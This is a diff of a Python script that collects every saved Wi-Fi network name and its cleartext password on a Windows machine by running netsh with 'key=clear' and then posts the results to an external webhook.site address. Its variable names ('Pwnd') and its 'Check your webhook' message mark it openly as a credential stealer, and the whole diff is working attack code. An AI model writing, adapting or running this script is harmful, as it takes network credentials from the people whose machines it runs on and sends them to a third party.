@@ -1,33 +1,37 @@
-import subprocess, os, sys, requests, xmltodict
+import subprocess, os, sys, requests, xmltodict, re, urllib
 
-# Replace with your webhook
 url = 'https://webhook.site/#####################'
-payload = {"Pwnd":[]}
+found_ssids = []
+pwnd = []
+wlan_profile_regex = r"All User Profile\s+:\s(.*)$"
+wlan_key_regex = r"Key Content\s+:\s(.*)$"
 
-#Use Python to execute Windows command
-command_output = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True).stdout.decode()
 
-print(command_output)
+get_profiles_command = subprocess.run(["netsh", "wlan", "show", "profiles"], stdout=subprocess.PIPE).stdout.decode()
 
-#Grab current directory
-path = os.getcwd()
+matches = re.finditer(wlan_profile_regex, get_profiles_command, re.MULTILINE)
+for match in matches:
+    for group in match.groups():
+        found_ssids.append(group.strip())
 
-#Append Wi-Fi XML files to wifi_files list
-for filename in os.listdir(path):
-    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
-        xml_content = open(filename,'rb')
-        as_dict = xmltodict.parse(xml_content)
-        xml_content.close()
-        payload['Pwnd'].append("%s:%s"% (as_dict['WLANProfile']['name'],as_dict['WLANProfile']['MSM']['security']['sharedKey']['keyMaterial']))
-        os.remove(filename)
+for ssid in found_ssids:
+    get_keys_command = subprocess.run(["netsh", "wlan", "show", "profile", ("%s" % (ssid)), "key=clear"], stdout=subprocess.PIPE).stdout.decode()
+    matches = re.finditer(wlan_key_regex, get_keys_command, re.MULTILINE)
+    for match in matches:
+        for group in match.groups():
+            pwnd.append({
+                "SSID":ssid,
+                "Password":group.strip()
+                }) 
 
-if len(payload["Pwnd"]) >= 1:
-    print("Wi-Fi profiles found. Check your webhook")
-else:
+if len(pwnd) == 0: # Early return if no data found
     print("No Wi-Fi profiles found. Exiting...")
     sys.exit()
 
-final_payload = ''
-for ssid in payload['Pwnd']:
-    final_payload += '%s; \n' % ssid
+print("Wi-Fi profiles found. Check your webhook...")
+
+final_payload = ""
+for pwnd_ssid in pwnd:
+    final_payload += "[SSID:%s, Password:%s]\n" % (pwnd_ssid["SSID"], pwnd_ssid["Password"]) # Payload display format can be changed as desired
+
 r = requests.post(url, params="format=json", data=final_payload)
